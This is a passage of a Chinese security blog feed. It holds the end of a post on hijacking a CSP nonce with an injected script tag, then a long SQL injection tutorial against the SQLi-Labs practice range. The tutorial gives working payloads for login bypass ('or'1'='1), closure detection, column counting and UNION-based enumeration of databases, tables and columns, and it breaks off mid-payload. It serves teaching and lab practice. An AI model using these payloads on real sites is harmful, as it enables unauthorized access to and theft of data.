class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;aa&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;abc&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;CSP&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以插入如下内容来利用浏览器补全功能：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.248.1/a.js&quot;</span> <span class="attr">a</span>=<span class="string">&quot;</span></span></span><br></pre></td></tr></table></figure><p>最终形成如下页面结构：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.248.1/a.js&quot;</span> <span class="attr">a</span>=<span class="string">&quot;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;script id=&quot;</span><span class="attr">aa</span>&quot; <span class="attr">nonce</span>=<span class="string">&quot;xxx&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;CSP&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码，也就是说浏览器会给我们自动补全只有一个双引号的属性的值。</p><p>还有一个注意点，上述的a标签在Chrome上是执行不了的，原因在于Chrome对于标签的解析方式则不同，Chrome中解析script标签的优先级高于解析属性双引号内的值，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2022/08/25/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/08/25/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="I、数据库基础"><a href="#I、数据库基础" class="headerlink" title="I、数据库基础"></a>I、数据库基础</h1><p><code>数据库系统（Database System）</code> 数据库系统（DBS）包括了数据库（DB）和数据库管理系统（DBMS）</p><p><code>数据库（Database）</code>是按照数据结构来组织、存储的仓库</p><p><code>数据库管理系统（Database Manage System）</code>是用于管理数据库的系统</p><p>关系型数据库是采用了关系模型来组织数据的数据库，简单的来说，就是二维表格模型。</p><p>可以以<code>Excel</code>表格来做一个理解</p><ul><li>数据以表格的形式出现</li><li>每一行为各种记录的名称</li><li>每一列为记录名称对应的数据域</li><li>许多行和列组成了一张表单</li><li>若干的表单组成Database</li></ul><h2 id="数据库管理工具"><a href="#数据库管理工具" class="headerlink" title="数据库管理工具"></a>数据库管理工具</h2><ul><li><strong>Navicat</strong></li><li><strong>phpMyAdmin</strong></li></ul><h1 id="II、Mysql基础"><a href="#II、Mysql基础" class="headerlink" title="II、Mysql基础"></a>II、Mysql基础</h1><p>在学习SQL注入之前，我们需要对Mysql有一定的了解，</p><h2 id="一、information-schema"><a href="#一、information-schema" class="headerlink" title="一、information_schema"></a>一、information_schema</h2><p><code>Information_schema</code>数据库是MySQL自带的，它提供了访问数据库元数据的方式</p><p><code>元数据</code>是关于数据的数据，如数据库名、表名、列名和数据类型、访问权限。这些信息也可以叫<code>数据词典</code> </p><p>在MySQL中，把<code>information_schema</code>看作是一个信息数据库，其中保存着所有其他数据库的信息，例如数据库名、表名、列名等…….</p><p>information_schema中部分数据表及字段：</p><p><strong>SCHEMATA</strong>：提供了当前MySql实例中所有的数据库信息。<code>show database</code>的结果取之此表</p><p><code>SELECT SCHEMA_NAME FROM information_schema.SCHEMATA</code></p><ul><li>schema_name 字段为当前所有的数据库</li></ul><p><strong>TABLES</strong>：提供了关于数据库中表的信息。详细描述了某个表属于哪个shema等信息。<code>show tables from &lt;schema_name&gt;</code>的结果取之于此</p><p><code>SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=&#39;’</code></p><ul><li>table_schema 字段为表从属的数据库</li><li>table_name 字段为表名</li></ul><p><strong>COLUMNS</strong>：  提供数据库中表和列的信息。详细描述了某张表的所有列 及每列的信息。<code>show columns from &lt;schema_name&gt;.&lt;table_name&gt;</code>的结果取之此表</p><p><code>SELECT TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME from information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;&lt;schema_name&gt;’</code></p><ul><li>table_schema 字段为</li><li>table_name 字段为表名</li><li>column_name 字段为列名</li></ul><h2 id="二、注释"><a href="#二、注释" class="headerlink" title="二、注释"></a>二、注释</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># # 单行注释</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users # 这是一个单行注释</span><br><span class="line"></span><br><span class="line"># <span class="comment">-- 注释（杠、杠、空格）</span></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users <span class="comment">-- 这是一个单行注释</span></span><br><span class="line"></span><br><span class="line"># <span class="comment">/* */</span> 这是一个多行注释</span><br><span class="line"><span class="comment">/*这是一个</span></span><br><span class="line"><span class="comment">多行注释*/</span></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure><h2 id="三、常用函数"><a href="#三、常用函数" class="headerlink" title="三、常用函数"></a>三、常用函数</h2><h3 id="1、内置函数"><a href="#1、内置函数" class="headerlink" title="1、内置函数"></a>1、内置函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前的数据库</span><br><span class="line">DATABASE()</span><br><span class="line"></span><br><span class="line"># 查看当前数据库版本</span><br><span class="line">@<span class="variable">@VERSION</span> </span><br><span class="line">VERSION()</span><br><span class="line"></span><br><span class="line"># 查看用户</span><br><span class="line"><span class="keyword">user</span>()                        # 用户名</span><br><span class="line"><span class="built_in">current_user</span>()                # 当前用户名</span><br><span class="line"><span class="built_in">system_user</span>()                 # 系统用户名</span><br><span class="line"><span class="built_in">session_user</span>()                # 链接数据库的用户名</span><br><span class="line"></span><br><span class="line"># 内置函数</span><br><span class="line">@<span class="variable">@datadir</span>                     # 读取数据库路径</span><br><span class="line">@<span class="variable">@basedir</span>                     # MySQL安装路径</span><br><span class="line">@<span class="variable">@version</span>_compile_os           # 操作系统</span><br><span class="line">@<span class="variable">@secure</span>_file_priv            # 查看数据库secure_file_priv 的参数值</span><br><span class="line">@<span class="variable">@character</span>_sets_dir          # 字符集安装目录</span><br><span class="line">@<span class="variable">@character</span>_set_server        # 字符集编码格式</span><br><span class="line">@<span class="variable">@hostname</span>;                   # 查看主机名</span><br></pre></td></tr></table></figure><h3 id="2、其他函数"><a href="#2、其他函数" class="headerlink" title="2、其他函数"></a>2、其他函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">concat([string],[string])  # 将两个字符串拼接为一个字符串</span><br><span class="line">concat_ws([sign],[string],[string])  # 将两个字符串使用符号拼接为一个字符串</span><br><span class="line">group_concat([<span class="keyword">array</span>],...,[<span class="keyword">array</span>])  # 将多组数据进行拼接，不同行之间使用逗号进行连接</span><br><span class="line"></span><br><span class="line">limit N,M  # 相当于 limit M <span class="keyword">offset</span> N , 从第 N 条记录开始, 返回 M 条记录</span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span>([string],[length])  # 返回字符串从左起length位 </span><br><span class="line"><span class="keyword">right</span>([string],[length])</span><br><span class="line">MID([string],[position],[length])</span><br><span class="line">REVERSE([string])  # 将字符串逆序输出</span><br><span class="line"></span><br><span class="line"><span class="built_in">count</span>()  # 返回查询到的结果数量</span><br></pre></td></tr></table></figure><h2 id="四、联合查询"><a href="#四、联合查询" class="headerlink" title="四、联合查询"></a>四、联合查询</h2><p>使用union字段可以进行联合查询，将前后两次查询结果拼接在一起，前提要求是两次查询的列数要相同</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 正常查询</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> security.users</span><br><span class="line"># 联合查询</span><br><span class="line"># 可以看到查询结果中多了一个条目</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> security.users <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"># 当前部分查询无结果，后部分查询结果将作为结果</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> security.users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="五、报错注入"><a href="#五、报错注入" class="headerlink" title="五、报错注入"></a>五、报错注入</h2><h3 id="1、xpath函数"><a href="#1、xpath函数" class="headerlink" title="1、xpath函数"></a>1、xpath函数</h3><p><code>updatexml()</code> <code>extractvalue()</code></p><p>在mysql 5.1中添加了对XML文档进行查询和修改的函数：updatexml（）extractvalue（）</p><p>这两个函数的作用相同，用一个不同的 xml标记 匹配和替换 原来的 xml块 的函数，可以简单理解为用于改变文档中符合条件的值</p><p><code>**updatexml()**</code>函数中需要传入三个参数：</p><p>第一个参数为string类型，代表xml文档的名称</p><p>第二个参数为xpath_string类型，代表路径</p><p>第三个参数为string类型，代表要替换的数据</p><p>报错的关键就在于第二个参数，当第二个参数中传入的值不为xpath_string类型的时候，该函数就会报错</p><figure class="highlight plaintext"><figcaption><span>JSX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username=&#x27;admin&#x27; and updatexml(1,0x7e,3)</span><br></pre></td></tr></table></figure><p><code>**extractvalue()**</code>和updatexml()除了参数数量之外基本相同</p><p>extractvalue(目标xml文档，xml路径)，报错点在第二个参数中</p><figure class="highlight plaintext"><figcaption><span>JSX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username=&#x27;admin&#x27; and extractvalue(1,0x7e)</span><br></pre></td></tr></table></figure><h1 id="III、SQLi-Labs靶场安装"><a href="#III、SQLi-Labs靶场安装" class="headerlink" title="III、SQLi-Labs靶场安装"></a>III、SQLi-Labs靶场安装</h1><h2 id="一、手动安装"><a href="#一、手动安装" class="headerlink" title="一、手动安装"></a>一、手动安装</h2><h3 id="1、下载源码"><a href="#1、下载源码" class="headerlink" title="1、下载源码"></a>1、下载源码</h3><p><a href="https://github.com/Audi-1/sqli-labs">GitHub - Audi-1&#x2F;sqli-labs: SQLI labs to test error based, Blind boolean based, Time based.</a></p><p><a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/056dfc8b-3b3a-41c3-b102-7b76c0c2ec9f/sqli-labs-master.zip">sqli-labs-master.zip</a></p><h3 id="2、搭建WAMP环境"><a href="#2、搭建WAMP环境" class="headerlink" title="2、搭建WAMP环境"></a>2、搭建WAMP环境</h3><p>使用PHPstudy创建<code>PHP 5.3.29</code>环境和<code>Mysql 5.7.26</code>环境</p><p>可在”网站→管理→PHP版本→php5.3.29nts”选择使用的PHP版本</p><p><img src="https://secure2.wostatic.cn/static/cQVG828ZsSC2QH1RSPhqkd/image.png"></p><h3 id="3、复制网站文件"><a href="#3、复制网站文件" class="headerlink" title="3、复制网站文件"></a>3、复制网站文件</h3><p>将下载的<code>sqli-labs-master.zip</code>中的<code>sqli-labs-master 文件夹</code> 解压到<code>phpstudy安装目录</code>下的<code>WWW</code>目录中</p><h3 id="4、修改网站配置文件"><a href="#4、修改网站配置文件" class="headerlink" title="4、修改网站配置文件"></a>4、修改网站配置文件</h3><p>进入刚刚解压出的文件夹内</p><p>在文件夹<code>sql-connections</code>中选择文件<code>db-creds.inc</code>并打开</p><p>修改文件中的密码与PHPstudy中数据库密码相同，其他部分可不做修改</p><h3 id="5、初始化数据库"><a href="#5、初始化数据库" class="headerlink" title="5、初始化数据库"></a>5、初始化数据库</h3><p>进入主页：<a href="http://192.168.31.98/sqli-labs/">http://192.168.31.98/sqli-labs/</a></p><p>打开靶场验证数据库是否可用</p><p><a href="http://192.168.31.98/sqli-labs/sql-connections/setup-db.php">http://192.168.31.98/sqli-labs/sql-connections/setup-db.php</a></p><h2 id="二、Docker安装"><a href="#二、Docker安装" class="headerlink" title="二、Docker安装"></a>二、Docker安装</h2><p>使用Docker进行安装非常的简单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker search sqli-labs  <span class="comment"># 搜索sqli-labs靶场</span></span><br><span class="line">docker pull acgpiano/sqli-labs  <span class="comment"># 拉取指定的靶场</span></span><br><span class="line">docker run -dt --name sqli-lab -p 8888:80 acgpiano/sqli-labs:latest</span><br></pre></td></tr></table></figure><p>这里将docker容器内的<code>80</code>端口映射到外部端口<code>8888</code>，映射端口可自行修改</p><h1 id="IV、SQL注入"><a href="#IV、SQL注入" class="headerlink" title="IV、SQL注入"></a>IV、SQL注入</h1><h2 id="一、概念："><a href="#一、概念：" class="headerlink" title="一、概念："></a>一、概念：</h2><p>所谓的SQL注入，就是通过把SQL命令插入到web表单递交到后台执行查询命令的字符串中，最终达到欺骗服务器执行恶意的SQL命令</p><p>用户可控的输入未经过滤就被带入到SQL语句中执行，从而导致SQL注入攻击的产生</p><h2 id="二、万能密码登陆"><a href="#二、万能密码登陆" class="headerlink" title="二、万能密码登陆"></a>二、万能密码登陆</h2><p>登陆功能，是web网站中常见的与数据库交互的一种的功能</p><p>万能密码，即是通过一个密码，绕过绕过登陆认证，成功登陆上系统</p><blockquote><p>‘or’1’&#x3D;’1</p></blockquote><p>万能密码的两种情况：<a href="http://192.168.31.98/sqli-labs/Less-11/">http://192.168.31.98/sqli-labs/Less-11/</a></p><ul><li><code>username=admin</code>&amp;<code>password=&#39;or&#39;1&#39;=&#39;1</code></li></ul><p>成功登陆<code>Dumb</code>用户</p><ul><li><code>username=admin&#39;or&#39;1&#39;=&#39;1</code>&amp;<code>password=1</code></li></ul><p>成功登陆<code>admin</code>用户</p><p>从代码角度来分析原理：</p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e1c483cc-7399-45cc-8531-8d445bb0b9a4/Untitled.png" alt="Untitled"></p><p>情况一：<code>username=admin</code>&amp;<code>password=&#39;or&#39;1&#39;=&#39;1</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>情况二：<code>username=admin&#39;or&#39;1&#39;=&#39;1</code>&amp;<code>password=1</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><aside><p>💡 在Mysql中<code>and</code>的优先级是要高于<code>or</code>的，在语句中同时存在两个字段，将先执行<code>and</code>，再执行<code>or</code></p></aside><p>通过传入特殊构造的语句，改变原后台语句的含义，而导致登陆成功。</p><h2 id="三、SQL注入的危害"><a href="#三、SQL注入的危害" class="headerlink" title="三、SQL注入的危害"></a>三、SQL注入的危害</h2><p>1、数据与信息泄漏</p><p>2、网页被篡改、网站挂马</p><p>3、服务器被远程控制</p><p>4、影响服务可用性</p><p>5、用户和企业财产安全</p><h2 id="四、SQL注入的分类"><a href="#四、SQL注入的分类" class="headerlink" title="四、SQL注入的分类"></a>四、SQL注入的分类</h2><ul><li>联合查询注入</li><li>报错注入</li><li>时间盲注</li><li>布尔盲注</li><li>堆叠注入</li></ul><p>除此之外，还有其他分类的注入</p><ul><li>二次注入</li><li>HTTP头注入</li><li>宽字节注入</li></ul><h2 id="五、闭合方式"><a href="#五、闭合方式" class="headerlink" title="五、闭合方式"></a>五、闭合方式</h2><p>1、通过报错信息来进行判断</p><p>2、通过页面响应正确与否来判断</p><h3 id="1、单引号-39-39-：less-11"><a href="#1、单引号-39-39-：less-11" class="headerlink" title="1、单引号&#39;&#39; ：less-11"></a>1、单引号<code>&#39;&#39;</code> ：less-11</h3><p>输入单引号报错，输入其他符号页面响应正常</p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/05f1096e-ed81-46eb-add0-62e01870ce78/Untitled.png" alt="Untitled"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 报错语句</span><br><span class="line"><span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span>admin<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 后台查询语句</span></span><br><span class="line"><span class="string">@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;</span>$uname<span class="string">&#x27; and password=&#x27;</span>$passwd<span class="string">&#x27; LIMIT 0,1&quot;;</span></span><br></pre></td></tr></table></figure><p>通过报错信息看出其中使用了<code>单引号</code>进行闭合，同时也多了一个单引号导致无法进行闭合</p><h3 id="2、括号双引号-quot-quot-：less-13"><a href="#2、括号双引号-quot-quot-：less-13" class="headerlink" title="2、括号双引号(&quot;&quot;)：less-13"></a>2、括号双引号<code>(&quot;&quot;)</code>：less-13</h3><p>输入单引号<code>&#39;</code>和单引号括号<code>&#39;)</code>报错</p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cf927659-929d-4ccd-8616-22d7d4ce51c7/Untitled.png" alt="Untitled"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 报错语句</span><br><span class="line"><span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span>) <span class="keyword">and</span> password<span class="operator">=</span>(<span class="string">&#x27;&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 后台查询语句</span></span><br><span class="line"><span class="string">@$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;</span>$uname<span class="string">&#x27;) and password=(&#x27;</span>$passwd<span class="string">&#x27;) LIMIT 0,1&quot;;</span></span><br></pre></td></tr></table></figure><h3 id="3、无闭合：less-2"><a href="#3、无闭合：less-2" class="headerlink" title="3、无闭合：less-2"></a>3、无闭合：less-2</h3><p>输入<code>?id=&#39;1</code></p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8c282a03-1269-4c08-b4b5-573b0ccf44d0/Untitled.png" alt="Untitled"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 报错语句</span><br><span class="line"><span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span><span class="number">1</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 后台查询语句</span></span><br><span class="line"><span class="string">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span></span><br></pre></td></tr></table></figure><h3 id="4、其他："><a href="#4、其他：" class="headerlink" title="4、其他："></a>4、其他：</h3><p>除以上介绍的几种之外，闭合方式还有很多种。在判断闭合方式的时候，主要根据报错语句及页面的响应来判断</p><h2 id="六、联合查询注入"><a href="#六、联合查询注入" class="headerlink" title="六、联合查询注入"></a>六、联合查询注入</h2><p><a href="http://192.168.31.98/sqli-labs/Less-11/">http://192.168.31.98/sqli-labs/Less-11/</a></p><p>联合查询注入是一种有回显的注入方法，利用union select 来构造payload进行查询，从而实现SQL注入攻击。</p><h3 id="1、判断闭合"><a href="#1、判断闭合" class="headerlink" title="1、判断闭合"></a>1、判断闭合</h3><p>传入下面值来进行判断</p><blockquote><p>uname&#x3D;<code>admin’</code>passwd&#x3D;<code>aaa</code></p></blockquote><p>或者</p><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>aaa&#39;</code></p></blockquote><p>观察页面的报错信息，通过报错信息可以判断出使用的是单引号进行闭合</p><h3 id="2、判断列数"><a href="#2、判断列数" class="headerlink" title="2、判断列数"></a>2、判断列数</h3><p>传入</p><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;order by 1--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;order by 2--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;order by 3--+</code></p></blockquote><p>当传入值为1和2时，页面响应正常。</p><p>当传入值为3时，页面报错提示<code>Unknown column &#39;3&#39; in &#39;order clause’</code></p><p>表示在当前的查询语句中只有两个字段</p><h3 id="3、判断回显位置"><a href="#3、判断回显位置" class="headerlink" title="3、判断回显位置"></a>3、判断回显位置</h3><p>部分从数据库获取的数据并不一定完整的被输出到页面上，因此要找到一个合适的输出位置来显示注入结果</p><p>使用union select 进行查询，从而判断回显位置</p><blockquote><p>username&#x3D;admin&amp;password&#x3D;’union select 1,2 –+</p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e2c9d2d3-9b11-421d-af6d-3b3089661326/Untitled.png" alt="Untitled"></p><p>由上可见，1，2位置都可以回显到页面</p><h3 id="4、获取数据库基础信息"><a href="#4、获取数据库基础信息" class="headerlink" title="4、获取数据库基础信息"></a>4、获取数据库基础信息</h3><p>利用数据库的内置函数进行信息收集</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前的数据库</span><br><span class="line"><span class="keyword">SELECT</span> DATABASE()</span><br><span class="line"></span><br><span class="line"># 查看当前数据库版本</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@VERSION</span> </span><br><span class="line"><span class="keyword">SELECT</span> VERSION()</span><br><span class="line"></span><br><span class="line"># 查看用户</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>()                        # 用户名</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">current_user</span>()                # 当前用户名</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">system_user</span>()                 # 系统用户名</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">session_user</span>()                # 链接数据库的用户名</span><br><span class="line"></span><br><span class="line"># 内置函数</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@datadir</span>                     # 读取数据库路径</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@basedir</span>                     # MySQL安装路径</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span>_compile_os           # 操作系统</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@secure</span>_file_priv            # 查看数据库secure_file_priv 的参数值</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@character</span>_sets_dir          # 字符集安装目录</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@character</span>_set_server        # 字符集编码格式</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@hostname</span>;                   # 查看主机名</span><br></pre></td></tr></table></figure><h3 id="5、查询数据库"><a href="#5、查询数据库" class="headerlink" title="5、查询数据库"></a>5、查询数据库</h3><p>使用<code>select database()</code> 可以查询数据库，但是仅能查询当前所在的数据库</p><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,database() --+</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/641bfdf8-54bd-438d-9b17-80491b6171c9/Untitled.png" alt="Untitled"></p><p>可以使用以下语句查询其他数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><p>由于以上语句查询出的结果为多列，因此需要使用<code>group_concat()</code>将结果进行拼接</p><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(schema_name) from information_schema.SCHEMATA --+</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/23c40e2a-b6b2-4e21-8118-04e868026058/Untitled.png" alt="Untitled"></p><h3 id="6、查询指定数据库内的表"><a href="#6、查询指定数据库内的表" class="headerlink" title="6、查询指定数据库内的表"></a>6、查询指定数据库内的表</h3><p>这里来查询<code>security</code>数据库内的表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7d0e922a-bdc5-42ed-a2c8-33c1c49db3ba/Untitled.png" alt="Untitled"></p><p>若是要查询其他数据库内的表，则更换table_schema的值即可</p><h3 id="7、查询表内的字段"><a href="#7、查询表内的字段" class="headerlink" title="7、查询表内的字段"></a>7、查询表内的字段</h3><p>这里来查询表<code>security.users</code> 内的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and 